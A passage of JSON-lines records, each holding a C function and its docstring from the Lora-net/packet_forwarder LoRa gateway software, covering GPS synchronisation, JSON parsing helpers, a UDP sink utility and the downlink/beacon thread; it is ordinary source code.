cp_gps_coord.alt, cp_nb_rx_rcv, cp_nb_rx_ok, cp_up_pkt_fwd, 100.0 * up_ack_ratio, cp_dw_dgram_rcv, cp_nb_tx_ok);\n        } else {\n            snprintf(status_report, STATUS_SIZE, \"\\\"stat\\\":{\\\"time\\\":\\\"%s\\\",\\\"rxnb\\\":%u,\\\"rxok\\\":%u,\\\"rxfw\\\":%u,\\\"ackr\\\":%.1f,\\\"dwnb\\\":%u,\\\"txnb\\\":%u}\", stat_timestamp, cp_nb_rx_rcv, cp_nb_rx_ok, cp_up_pkt_fwd, 100.0 * up_ack_ratio, cp_dw_dgram_rcv, cp_nb_tx_ok);\n        }\n        report_ready = true;\n        pthread_mutex_unlock(&mx_stat_rep);\n    }\n\n    /* wait for upstream thread to finish (1 fetch cycle max) */\n    pthread_join(thrid_up, NULL);\n    pthread_cancel(thrid_down); /* don't wait for downstream thread */\n    pthread_cancel(thrid_jit); /* don't wait for jit thread */\n    pthread_cancel(thrid_timersync); /* don't wait for timer sync thread */\n    if (gps_enabled == true) {\n        pthread_cancel(thrid_gps); /* don't wait for GPS thread */\n        pthread_cancel(thrid_valid); /* don't wait for validation thread */\n\n        i = lgw_gps_disable(gps_tty_fd);\n        if (i == LGW_HAL_SUCCESS) {\n            MSG(\"INFO: GPS closed successfully\\n\");\n        } else {\n            MSG(\"WARNING: failed to close GPS successfully\\n\");\n        }\n    }\n\n    /* if an exit signal was received, try to quit properly */\n    if (exit_sig) {\n        /* shut down network sockets */\n        shutdown(sock_up, SHUT_RDWR);\n        shutdown(sock_down, SHUT_RDWR);\n        /* stop the hardware */\n        i = lgw_stop();\n        if (i == LGW_HAL_SUCCESS) {\n            MSG(\"INFO: concentrator stopped successfully\\n\");\n        } else {\n            MSG(\"WARNING: failed to stop concentrator successfully\\n\");\n        }\n    }\n\n    MSG(\"INFO: Exiting packet forwarder program\\n\");\n    exit(EXIT_SUCCESS);\n}", "path": "packet_forwarder/lora_pkt_fwd/src/lora_pkt_fwd.c", "commit_date": "2017-04-05 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- THREAD 4: PARSE GPS MESSAGE AND KEEP GATEWAY IN SYNC ----------------- */\n", "func_signal": "static void gps_process_sync(void)", "code": "{\n    struct timespec gps_time;\n    struct timespec utc;\n    uint32_t trig_tstamp; /* concentrator timestamp associated with PPM pulse */\n    int i = lgw_gps_get(&utc, &gps_time, NULL, NULL);\n\n    /* get GPS time for synchronization */\n    if (i != LGW_GPS_SUCCESS) {\n        MSG(\"WARNING: [gps] could not get GPS time from GPS\\n\");\n        return;\n    }\n\n    /* get timestamp captured on PPM pulse  */\n    pthread_mutex_lock(&mx_concent);\n    i = lgw_get_trigcnt(&trig_tstamp);\n    pthread_mutex_unlock(&mx_concent);\n    if (i != LGW_HAL_SUCCESS) {\n        MSG(\"WARNING: [gps] failed to read concentrator timestamp\\n\");\n        return;\n    }\n\n    /* try to update time reference with the new GPS time & timestamp */\n    pthread_mutex_lock(&mx_timeref);\n    i = lgw_gps_sync(&time_reference_gps, trig_tstamp, utc, gps_time);\n    pthread_mutex_unlock(&mx_timeref);\n    if (i != LGW_GPS_SUCCESS) {\n        MSG(\"WARNING: [gps] GPS out of sync, keeping previous time reference\\n\");\n    }\n}", "path": "packet_forwarder/lora_pkt_fwd/src/lora_pkt_fwd.c", "commit_date": "2017-04-05 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* JSON Array API */\n", "func_signal": "JSON_Value * json_array_get_value(const JSON_Array *array, size_t index)", "code": "{\n    if (index >= json_array_get_count(array))\n        return NULL;\n    return array->items[index];\n}", "path": "packet_forwarder/lora_pkt_fwd/src/parson.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* describe command line options */\n", "func_signal": "void usage(void)", "code": "{\n    MSG(\"Usage: util_tx_test {options}\\n\");\n    MSG(\"Available options:\\n\");\n    MSG(\" -h print this help\\n\");\n    MSG(\" -n <int or service> port number for gateway link\\n\");\n    MSG(\" -f <float> target frequency in MHz\\n\");\n    MSG(\" -m <str> Modulation type ['LORA, 'FSK']\\n\");\n    MSG(\" -s <int> Spreading Factor [7:12]\\n\");\n    MSG(\" -b <int> Modulation bandwidth in kHz [125,250,500]\\n\");\n    MSG(\" -d <uint> FSK frequency deviation in kHz [1:250]\\n\");\n    MSG(\" -r <float> FSK bitrate in kbps [0.5:250]\\n\");\n    MSG(\" -p <int> RF power (dBm)\\n\");\n    MSG(\" -z <uint> Payload size in bytes [9:255]\\n\");\n    MSG(\" -t <int> pause between packets (ms)\\n\");\n    MSG(\" -x <int> numbers of times the sequence is repeated\\n\");\n    MSG(\" -v <uint> test ID, inserted in payload for PER test [0:255]\\n\");\n    MSG(\" -i send packet using inverted modulation polarity \\n\");\n}", "path": "packet_forwarder/util_tx_test/src/util_tx_test.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* JSON Value */\n", "func_signal": "static JSON_Value * json_value_init_string_no_copy(char *string)", "code": "{\n    JSON_Value *new_value = (JSON_Value*)parson_malloc(sizeof(JSON_Value));\n    if (!new_value)\n        return NULL;\n    new_value->type = JSONString;\n    new_value->value.string = string;\n    return new_value;\n}", "path": "packet_forwarder/lora_pkt_fwd/src/parson.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- MAIN FUNCTION -------------------------------------------------------- */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    int i; /* loop variable and temporary variable for return value */\n\n    /* server socket creation */\n    int sock; /* socket file descriptor */\n    struct addrinfo hints;\n    struct addrinfo *result; /* store result of getaddrinfo */\n    struct addrinfo *q; /* pointer to move into *result data */\n    char host_name[64];\n    char port_name[64];\n\n    /* variables for receiving packets */\n    struct sockaddr_storage dist_addr;\n    socklen_t addr_len = sizeof dist_addr;\n    uint8_t databuf[4096];\n    int byte_nb;\n\n    /* check if port number was passed as parameter */\n    if (argc != 2) {\n        MSG(\"Usage: util_sink <port number>\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    /* prepare hints to open network sockets */\n    memset(&hints, 0, sizeof hints);\n    hints.ai_family = AF_UNSPEC; /* should handle IP v4 or v6 automatically */\n    hints.ai_socktype = SOCK_DGRAM;\n    hints.ai_flags = AI_PASSIVE; /* will assign local IP automatically */\n\n    /* look for address */\n    i = getaddrinfo(NULL, argv[1], &hints, &result);\n    if (i != 0) {\n        MSG(\"ERROR: getaddrinfo returned %s\\n\", gai_strerror(i));\n        exit(EXIT_FAILURE);\n    }\n\n    /* try to open socket and bind it */\n    for (q=result; q!=NULL; q=q->ai_next) {\n        sock = socket(q->ai_family, q->ai_socktype,q->ai_protocol);\n        if (sock == -1) {\n            continue; /* socket failed, try next field */\n        } else {\n            i = bind(sock, q->ai_addr, q->ai_addrlen);\n            if (i == -1) {\n                shutdown(sock, SHUT_RDWR);\n                continue; /* bind failed, try next field */\n            } else {\n                break; /* success, get out of loop */\n            }\n        }\n    }\n    if (q == NULL) {\n        MSG(\"ERROR: failed to open socket or to bind to it\\n\");\n        i = 1;\n        for (q=result; q!=NULL; q=q->ai_next) {\n            getnameinfo(q->ai_addr, q->ai_addrlen, host_name, sizeof host_name, port_name, sizeof port_name, NI_NUMERICHOST);\n            MSG(\"result %i host:%s service:%s\\n\", i, host_name, port_name);\n            ++i;\n        }\n        exit(EXIT_FAILURE);\n    }\n    MSG(\"INFO: util_sink listening on port %s\\n\", argv[1]);\n    freeaddrinfo(result);\n\n    while (1) {\n        byte_nb = recvfrom(sock, databuf, sizeof databuf, 0, (struct sockaddr *)&dist_addr, &addr_len);\n        if (byte_nb == -1) {\n            MSG(\"ERROR: recvfrom returned %s \\n\", strerror(errno));\n            exit(EXIT_FAILURE);\n        }\n        getnameinfo((struct sockaddr *)&dist_addr, addr_len, host_name, sizeof host_name, port_name, sizeof port_name, NI_NUMERICHOST);\n        printf(\"Got packet from host %s port %s, %i bytes long\\n\", host_name, port_name, byte_nb);\n    }\n}", "path": "packet_forwarder/util_sink/src/util_sink.c", "commit_date": "2016-06-06 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* Various */\n", "func_signal": "static char * parson_strndup(const char *string, size_t n)", "code": "{\n    char *output_string = (char*)parson_malloc(n + 1);\n    if (!output_string)\n        return NULL;\n    output_string[n] = '\\0';\n    strncpy(output_string, string, n);\n    return output_string;\n}", "path": "packet_forwarder/lora_pkt_fwd/src/parson.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- PRIVATE FUNCTIONS DEFINITION ----------------------------------------- */\n", "func_signal": "static void sig_handler(int sigio)", "code": "{\n    if (sigio == SIGQUIT) {\n        quit_sig = 1;;\n    } else if ((sigio == SIGINT) || (sigio == SIGTERM)) {\n        exit_sig = 1;\n    }\n}", "path": "packet_forwarder/util_tx_test/src/util_tx_test.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- THREAD 2: POLLING SERVER AND ENQUEUING PACKETS IN JIT QUEUE ---------- */\n", "func_signal": "void thread_down(void)", "code": "{\n    int i; /* loop variables */\n\n    /* configuration and metadata for an outbound packet */\n    struct lgw_pkt_tx_s txpkt;\n    bool sent_immediate = false; /* option to sent the packet immediately */\n\n    /* local timekeeping variables */\n    struct timespec send_time; /* time of the pull request */\n    struct timespec recv_time; /* time of return from recv socket call */\n\n    /* data buffers */\n    uint8_t buff_down[1000]; /* buffer to receive downstream packets */\n    uint8_t buff_req[12]; /* buffer to compose pull requests */\n    int msg_len;\n\n    /* protocol variables */\n    uint8_t token_h; /* random token for acknowledgement matching */\n    uint8_t token_l; /* random token for acknowledgement matching */\n    bool req_ack = false; /* keep track of whether PULL_DATA was acknowledged or not */\n\n    /* JSON parsing variables */\n    JSON_Value *root_val = NULL;\n    JSON_Object *txpk_obj = NULL;\n    JSON_Value *val = NULL; /* needed to detect the absence of some fields */\n    const char *str; /* pointer to sub-strings in the JSON data */\n    short x0, x1;\n    uint64_t x2;\n    double x3, x4;\n\n    /* variables to send on GPS timestamp */\n    struct tref local_ref; /* time reference used for GPS <-> timestamp conversion */\n    struct timespec gps_tx; /* GPS time that needs to be converted to timestamp */\n\n    /* beacon variables */\n    struct lgw_pkt_tx_s beacon_pkt;\n    uint8_t beacon_chan;\n    uint8_t beacon_loop;\n    size_t beacon_RFU1_size = 0;\n    size_t beacon_RFU2_size = 0;\n    uint8_t beacon_pyld_idx = 0;\n    time_t diff_beacon_time;\n    struct timespec next_beacon_gps_time; /* gps time of next beacon packet */\n    struct timespec last_beacon_gps_time; /* gps time of last enqueued beacon packet */\n    int retry;\n\n    /* beacon data fields, byte 0 is Least Significant Byte */\n    int32_t field_latitude; /* 3 bytes, derived from reference latitude */\n    int32_t field_longitude; /* 3 bytes, derived from reference longitude */\n    uint16_t field_crc1, field_crc2;\n\n    /* auto-quit variable */\n    uint32_t autoquit_cnt = 0; /* count the number of PULL_DATA sent since the latest PULL_ACK */\n\n    /* Just In Time downlink */\n    struct timeval current_unix_time;\n    struct timeval current_concentrator_time;\n    enum jit_error_e jit_result = JIT_ERROR_OK;\n    enum jit_pkt_type_e downlink_type;\n\n    /* set downstream socket RX timeout */\n    i = setsockopt(sock_down, SOL_SOCKET, SO_RCVTIMEO, (void *)&pull_timeout, sizeof pull_timeout);\n    if (i != 0) {\n        MSG(\"ERROR: [down] setsockopt returned %s\\n\", strerror(errno));\n        exit(EXIT_FAILURE);\n    }\n\n    /* pre-fill the pull request buffer with fixed fields */\n    buff_req[0] = PROTOCOL_VERSION;\n    buff_req[3] = PKT_PULL_DATA;\n    *(uint32_t *)(buff_req + 4) = net_mac_h;\n    *(uint32_t *)(buff_req + 8) = net_mac_l;\n\n    /* beacon variables initialization */\n    last_beacon_gps_time.tv_sec = 0;\n    last_beacon_gps_time.tv_nsec = 0;\n\n    /* beacon packet parameters */\n    beacon_pkt.tx_mode = ON_GPS; /* send on PPS pulse */\n    beacon_pkt.rf_chain = 0; /* antenna A */\n    beacon_pkt.rf_power = beacon_power;\n    beacon_pkt.modulation = MOD_LORA;\n    switch (beacon_bw_hz) {\n        case 125000:\n            beacon_pkt.bandwidth = BW_125KHZ;\n            break;\n        case 500000:\n            beacon_pkt.bandwidth = BW_500KHZ;\n            break;\n        default:\n            /* should not happen */\n            MSG(\"ERROR: unsupported bandwidth for beacon\\n\");\n            exit(EXIT_FAILURE);\n    }\n    switch (beacon_datarate) {\n        case 8:\n            beacon_pkt.datarate = DR_LORA_SF8;\n            beacon_RFU1_size = 1;\n            beacon_RFU2_size = 3;\n            break;\n        case 9:\n            beacon_pkt.datarate = DR_LORA_SF9;\n            beacon_RFU1_size = 2;\n            beacon_RFU2_size = 0;\n            break;\n        case 10:\n            beacon_pkt.datarate = DR_LORA_SF10;\n            beacon_RFU1_size = 3;\n            beacon_RFU2_size = 1;\n            break;\n        case 12:\n            beacon_pkt.datarate = DR_LORA_SF12;\n            beacon_RFU1_size = 5;\n            beacon_RFU2_size = 3;\n            break;\n        default:\n            /* should not happen */\n            MSG(\"ERROR: unsupported datarate for beacon\\n\");\n            exit(EXIT_FAILURE);\n    }\n    beacon_pkt.size = beacon_RFU1_size + 4 + 2 + 7 + beacon_RFU2_size + 2;\n    beacon_pkt.coderate = CR_LORA_4_5;\n    beacon_pkt.invert_pol = false;\n    beacon_pkt.preamble = 10;\n    beacon_pkt.no_crc = true;\n    beacon_pkt.no_header = true;\n\n    /* network common part beacon fields (little endian) */\n    for (i = 0; i < (int)beacon_RFU1_size; i++) {\n        beacon_pkt.payload[beacon_pyld_idx++] = 0x0;\n    }\n\n    /* network common part beacon fields (little endian) */\n    beacon_pyld_idx += 4; /* time (variable), filled later */\n    beacon_pyld_idx += 2; /* crc1 (variable), filled later */\n\n    /* calculate the latitude and longitude that must be publicly reported */\n    field_latitude = (int32_t)((reference_coord.lat / 90.0) * (double)(1<<23));\n    if (field_latitude > (int32_t)0x007FFFFF) {\n        field_latitude = (int32_t)0x007FFFFF; /* +90 N is represented as 89.99999 N */\n    } else if (field_latitude < (int32_t)0xFF800000) {\n        field_latitude = (int32_t)0xFF800000;\n    }\n    field_longitude = (int32_t)((reference_coord.lon / 180.0) * (double)(1<<23));\n    if (field_longitude > (int32_t)0x007FFFFF) {\n        field_longitude = (int32_t)0x007FFFFF; /* +180 E is represented as 179.99999 E */\n    } else if (field_longitude < (int32_t)0xFF800000) {\n        field_longitude = (int32_t)0xFF800000;\n    }\n\n    /* gateway specific beacon fields */\n    beacon_pkt.payload[beacon_pyld_idx++] = beacon_infodesc;\n    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF &  field_latitude;\n    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF & (field_latitude >>  8);\n    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF & (field_latitude >> 16);\n    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF &  field_longitude;\n    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF & (field_longitude >>  8);\n    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF & (field_longitude >> 16);\n\n    /* RFU */\n    for (i = 0; i < (int)beacon_RFU2_size; i++) {\n        beacon_pkt.payload[beacon_pyld_idx++] = 0x0;\n    }\n\n    /* CRC of the beacon gateway specific part fields */\n    field_crc2 = crc16((beacon_pkt.payload + 6 + beacon_RFU1_size), 7 + beacon_RFU2_size);\n    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF &  field_crc2;\n    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF & (field_crc2 >> 8);\n\n    /* JIT queue initialization */\n    jit_queue_init(&jit_queue);\n\n    while (!exit_sig && !quit_sig) {\n\n        /* auto-quit if the threshold is crossed */\n        if ((autoquit_threshold > 0) && (autoquit_cnt >= autoquit_threshold)) {\n            exit_sig = true;\n            MSG(\"INFO: [down] the last %u PULL_DATA were not ACKed, exiting application\\n\", autoquit_threshold);\n            break;\n        }\n\n        /* generate random token for request */\n        token_h = (uint8_t)rand(); /* random token */\n        token_l = (uint8_t)rand(); /* random token */\n        buff_req[1] = token_h;\n        buff_req[2] = token_l;\n\n        /* send PULL request and record time */\n        send(sock_down, (void *)buff_req, sizeof buff_req, 0);\n        clock_gettime(CLOCK_MONOTONIC, &send_time);\n        pthread_mutex_lock(&mx_meas_dw);\n        meas_dw_pull_sent += 1;\n        pthread_mutex_unlock(&mx_meas_dw);\n        req_ack = false;\n        autoquit_cnt++;\n\n        /* listen to packets and process them until a new PULL request must be sent */\n        recv_time = send_time;\n        while ((int)difftimespec(recv_time, send_time) < keepalive_time) {\n\n            /* try to receive a datagram */\n            msg_len = recv(sock_down, (void *)buff_down, (sizeof buff_down)-1, 0);\n            clock_gettime(CLOCK_MONOTONIC, &recv_time);\n\n            /* Pre-allocate beacon slots in JiT queue, to check downlink collisions */\n            beacon_loop = JIT_NUM_BEACON_IN_QUEUE - jit_queue.num_beacon;\n            retry = 0;\n            while (beacon_loop && (beacon_period != 0)) {\n                pthread_mutex_lock(&mx_timeref);\n                /* Wait for GPS to be ready before inserting beacons in JiT queue */\n                if ((gps_ref_valid == true) && (xtal_correct_ok == true)) {\n\n                    /* compute GPS time for next beacon to come      */\n                    /*   LoRaWAN: T = k*beacon_period + TBeaconDelay */\n                    /*            with TBeaconDelay = [1.5ms +/- 1\u00b5s]*/\n                    if (last_beacon_gps_time.tv_sec == 0) {\n                        /* if no beacon has been queued, get next slot from current GPS time */\n                        diff_beacon_time = time_reference_gps.gps.tv_sec % ((time_t)beacon_period);\n                        next_beacon_gps_time.tv_sec = time_reference_gps.gps.tv_sec +\n                                                        ((time_t)beacon_period - diff_beacon_time);\n                    } else {\n                        /* if there is already a beacon, take it as reference */\n                        next_beacon_gps_time.tv_sec = last_beacon_gps_time.tv_sec + beacon_period;\n                    }\n                    /* now we can add a beacon_period to the reference to get next beacon GPS time */\n                    next_beacon_gps_time.tv_sec += (retry * beacon_period);\n                    next_beacon_gps_time.tv_nsec = 0;\n\n#if DEBUG_BEACON\n                    {\n                    time_t time_unix;\n\n                    time_unix = time_reference_gps.gps.tv_sec + UNIX_GPS_EPOCH_OFFSET;\n                    MSG_DEBUG(DEBUG_BEACON, \"GPS-now : %s\", ctime(&time_unix));\n                    time_unix = last_beacon_gps_time.tv_sec + UNIX_GPS_EPOCH_OFFSET;\n                    MSG_DEBUG(DEBUG_BEACON, \"GPS-last: %s\", ctime(&time_unix));\n                    time_unix = next_beacon_gps_time.tv_sec + UNIX_GPS_EPOCH_OFFSET;\n                    MSG_DEBUG(DEBUG_BEACON, \"GPS-next: %s\", ctime(&time_unix));\n                    }\n#endif\n\n                    /* convert GPS time to concentrator time, and set packet counter for JiT trigger */\n                    lgw_gps2cnt(time_reference_gps, next_beacon_gps_time, &(beacon_pkt.count_us));\n                    pthread_mutex_unlock(&mx_timeref);\n\n                    /* apply frequency correction to beacon TX frequency */\n                    if (beacon_freq_nb > 1) {\n                        beacon_chan = (next_beacon_gps_time.tv_sec / beacon_period) % beacon_freq_nb; /* floor rounding */\n                    } else {\n                        beacon_chan = 0;\n                    }\n                    /* Compute beacon frequency */\n                    beacon_pkt.freq_hz = beacon_freq_hz + (beacon_chan * beacon_freq_step);\n\n                    /* load time in beacon payload */\n                    beacon_pyld_idx = beacon_RFU1_size;\n                    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF &  next_beacon_gps_time.tv_sec;\n                    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF & (next_beacon_gps_time.tv_sec >>  8);\n                    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF & (next_beacon_gps_time.tv_sec >> 16);\n                    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF & (next_beacon_gps_time.tv_sec >> 24);\n\n                    /* calculate CRC */\n                    field_crc1 = crc16(beacon_pkt.payload, 4 + beacon_RFU1_size); /* CRC for the network common part */\n                    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF & field_crc1;\n                    beacon_pkt.payload[beacon_pyld_idx++] = 0xFF & (field_crc1 >> 8);\n\n                    /* Insert beacon packet in JiT queue */\n                    gettimeofday(&current_unix_time, NULL);\n                    get_concentrator_time(&current_concentrator_time, current_unix_time);\n                    jit_result = jit_enqueue(&jit_queue, &current_concentrator_time, &beacon_pkt, JIT_PKT_TYPE_BEACON);\n                    if (jit_result == JIT_ERROR_OK) {\n                        /* update stats */\n                        pthread_mutex_lock(&mx_meas_dw);\n                        meas_nb_beacon_queued += 1;\n                        pthread_mutex_unlock(&mx_meas_dw);\n\n                        /* One more beacon in the queue */\n                        beacon_loop--;\n                        retry = 0;\n                        last_beacon_gps_time.tv_sec = next_beacon_gps_time.tv_sec; /* keep this beacon time as reference for next one to be programmed */\n\n                        /* display beacon payload */\n                        MSG(\"INFO: Beacon queued (count_us=%u, freq_hz=%u, size=%u):\\n\", beacon_pkt.count_us, beacon_pkt.freq_hz, beacon_pkt.size);\n                        printf( \"   => \" );\n                        for (i = 0; i < beacon_pkt.size; ++i) {\n                            MSG(\"%02X \", beacon_pkt.payload[i]);\n                        }\n                        MSG(\"\\n\");\n                    } else {\n                        MSG_DEBUG(DEBUG_BEACON, \"--> beacon queuing failed with %d\\n\", jit_result);\n                        /* update stats */\n                        pthread_mutex_lock(&mx_meas_dw);\n                        if (jit_result != JIT_ERROR_COLLISION_BEACON) {\n                            meas_nb_beacon_rejected += 1;\n                        }\n                        pthread_mutex_unlock(&mx_meas_dw);\n                        /* In case previous enqueue failed, we retry one period later until it succeeds */\n                        /* Note: In case the GPS has been unlocked for a while, there can be lots of retries */\n                        /*       to be done from last beacon time to a new valid one */\n                        retry++;\n                        MSG_DEBUG(DEBUG_BEACON, \"--> beacon queuing retry=%d\\n\", retry);\n                    }\n                } else {\n                    pthread_mutex_unlock(&mx_timeref);\n                    break;\n                }\n            }\n\n            /* if no network message was received, got back to listening sock_down socket */\n            if (msg_len == -1) {\n                //MSG(\"WARNING: [down] recv returned %s\\n\", strerror(errno)); /* too verbose */\n                continue;\n            }\n\n            /* if the datagram does not respect protocol, just ignore it */\n            if ((msg_len < 4) || (buff_down[0] != PROTOCOL_VERSION) || ((buff_down[3] != PKT_PULL_RESP) && (buff_down[3] != PKT_PULL_ACK))) {\n                MSG(\"WARNING: [down] ignoring invalid packet len=%d, protocol_version=%d, id=%d\\n\",\n                        msg_len, buff_down[0], buff_down[3]);\n                continue;\n            }\n\n            /* if the datagram is an ACK, check token */\n            if (buff_down[3] == PKT_PULL_ACK) {\n                if ((buff_down[1] == token_h) && (buff_down[2] == token_l)) {\n                    if (req_ack) {\n                        MSG(\"INFO: [down] duplicate ACK received :)\\n\");\n                    } else { /* if that packet was not already acknowledged */\n                        req_ack = true;\n                        autoquit_cnt = 0;\n                        pthread_mutex_lock(&mx_meas_dw);\n                        meas_dw_ack_rcv += 1;\n                        pthread_mutex_unlock(&mx_meas_dw);\n                        MSG(\"INFO: [down] PULL_ACK received in %i ms\\n\", (int)(1000 * difftimespec(recv_time, send_time)));\n                    }\n                } else { /* out-of-sync token */\n                    MSG(\"INFO: [down] received out-of-sync ACK\\n\");\n                }\n                continue;\n            }\n\n            /* the datagram is a PULL_RESP */\n            buff_down[msg_len] = 0; /* add string terminator, just to be safe */\n            MSG(\"INFO: [down] PULL_RESP received  - token[%d:%d] :)\\n\", buff_down[1], buff_down[2]); /* very verbose */\n            printf(\"\\nJSON down: %s\\n\", (char *)(buff_down + 4)); /* DEBUG: display JSON payload */\n\n            /* initialize TX struct and try to parse JSON */\n            memset(&txpkt, 0, sizeof txpkt);\n            root_val = json_parse_string_with_comments((const char *)(buff_down + 4)); /* JSON offset */\n            if (root_val == NULL) {\n                MSG(\"WARNING: [down] invalid JSON, TX aborted\\n\");\n                continue;\n            }\n\n            /* look for JSON sub-object 'txpk' */\n            txpk_obj = json_object_get_object(json_value_get_object(root_val), \"txpk\");\n            if (txpk_obj == NULL) {\n                MSG(\"WARNING: [down] no \\\"txpk\\\" object in JSON, TX aborted\\n\");\n                json_value_free(root_val);\n                continue;\n            }\n\n            /* Parse \"immediate\" tag, or target timestamp, or UTC time to be converted by GPS (mandatory) */\n            i = json_object_get_boolean(txpk_obj,\"imme\"); /* can be 1 if true, 0 if false, or -1 if not a JSON boolean */\n            if (i == 1) {\n                /* TX procedure: send immediately */\n                sent_immediate = true;\n                downlink_type = JIT_PKT_TYPE_DOWNLINK_CLASS_C;\n                MSG(\"INFO: [down] a packet will be sent in \\\"immediate\\\" mode\\n\");\n            } else {\n                sent_immediate = false;\n                val = json_object_get_value(txpk_obj,\"tmst\");\n                if (val != NULL) {\n                    /* TX procedure: send on timestamp value */\n                    txpkt.count_us = (uint32_t)json_value_get_number(val);\n\n                    /* Concentrator timestamp is given, we consider it is a Class A downlink */\n                    downlink_type = JIT_PKT_TYPE_DOWNLINK_CLASS_A;\n                } else {\n                    /* TX procedure: send on GPS time (converted to timestamp value) */\n                    val = json_object_get_value(txpk_obj, \"tmms\");\n                    if (val == NULL) {\n                        MSG(\"WARNING: [down] no mandatory \\\"txpk.tmst\\\" or \\\"txpk.tmms\\\" objects in JSON, TX aborted\\n\");\n                        json_value_free(root_val);\n                        continue;\n                    }\n                    if (gps_enabled == true) {\n                        pthread_mutex_lock(&mx_timeref);\n                        if (gps_ref_valid == true) {\n                            local_ref = time_reference_gps;\n                            pthread_mutex_unlock(&mx_timeref);\n                        } else {\n                            pthread_mutex_unlock(&mx_timeref);\n                            MSG(\"WARNING: [down] no valid GPS time reference yet, impossible to send packet on specific GPS time, TX aborted\\n\");\n                            json_value_free(root_val);\n\n                            /* send acknoledge datagram to server */\n                            send_tx_ack(buff_down[1], buff_down[2], JIT_ERROR_GPS_UNLOCKED);\n                            continue;\n                        }\n                    } else {\n                        MSG(\"WARNING: [down] GPS disabled, impossible to send packet on specific GPS time, TX aborted\\n\");\n                        json_value_free(root_val);\n\n                        /* send acknoledge datagram to server */\n                        send_tx_ack(buff_down[1], buff_down[2], JIT_ERROR_GPS_UNLOCKED);\n                        continue;\n                    }\n\n                    /* Get GPS time from JSON */\n                    x2 = (uint64_t)json_value_get_number(val);\n\n                    /* Convert GPS time from milliseconds to timespec */\n                    x3 = modf((double)x2/1E3, &x4);\n                    gps_tx.tv_sec = (time_t)x4; /* get seconds from integer part */\n                    gps_tx.tv_nsec = (long)(x3 * 1E9); /* get nanoseconds from fractional part */\n\n                    /* transform GPS time to timestamp */\n                    i = lgw_gps2cnt(local_ref, gps_tx, &(txpkt.count_us));\n                    if (i != LGW_GPS_SUCCESS) {\n                        MSG(\"WARNING: [down] could not convert GPS time to timestamp, TX aborted\\n\");\n                        json_value_free(root_val);\n                        continue;\n                    } else {\n                        MSG(\"INFO: [down] a packet will be sent on timestamp value %u (calculated from GPS time)\\n\", txpkt.count_us);\n                    }\n\n                    /* GPS timestamp is given, we consider it is a Class B downlink */\n                    downlink_type = JIT_PKT_TYPE_DOWNLINK_CLASS_B;\n                }\n            }\n\n            /* Parse \"No CRC\" flag (optional field) */\n            val = json_object_get_value(txpk_obj,\"ncrc\");\n            if (val != NULL) {\n                txpkt.no_crc = (bool)json_value_get_boolean(val);\n            }\n\n            /* parse target frequency (mandatory) */\n            val = json_object_get_value(txpk_obj,\"freq\");\n            if (val == NULL) {\n                MSG(\"WARNING: [down] no mandatory \\\"txpk.freq\\\" object in JSON, TX aborted\\n\");\n                json_value_free(root_val);\n                continue;\n            }\n            txpkt.freq_hz = (uint32_t)((double)(1.0e6) * json_value_get_number(val));\n\n            /* parse RF chain used for TX (mandatory) */\n            val = json_object_get_value(txpk_obj,\"rfch\");\n            if (val == NULL) {\n                MSG(\"WARNING: [down] no mandatory \\\"txpk.rfch\\\" object in JSON, TX aborted\\n\");\n                json_value_free(root_val);\n                continue;\n            }\n            txpkt.rf_chain = (uint8_t)json_value_get_number(val);\n\n            /* parse TX power (optional field) */\n            val = json_object_get_value(txpk_obj,\"powe\");\n            if (val != NULL) {\n                txpkt.rf_power = (int8_t)json_value_get_number(val) - antenna_gain;\n            }\n\n            /* Parse modulation (mandatory) */\n            str = json_object_get_string(txpk_obj, \"modu\");\n            if (str == NULL) {\n                MSG(\"WARNING: [down] no mandatory \\\"txpk.modu\\\" object in JSON, TX aborted\\n\");\n                json_value_free(root_val);\n                continue;\n            }\n            if (strcmp(str, \"LORA\") == 0) {\n                /* Lora modulation */\n                txpkt.modulation = MOD_LORA;\n\n                /* Parse Lora spreading-factor and modulation bandwidth (mandatory) */\n                str = json_object_get_string(txpk_obj, \"datr\");\n                if (str == NULL) {\n                    MSG(\"WARNING: [down] no mandatory \\\"txpk.datr\\\" object in JSON, TX aborted\\n\");\n                    json_value_free(root_val);\n                    continue;\n                }\n                i = sscanf(str, \"SF%2hdBW%3hd\", &x0, &x1);\n                if (i != 2) {\n                    MSG(\"WARNING: [down] format error in \\\"txpk.datr\\\", TX aborted\\n\");\n                    json_value_free(root_val);\n                    continue;\n                }\n                switch (x0) {\n                    case  7: txpkt.datarate = DR_LORA_SF7;  break;\n                    case  8: txpkt.datarate = 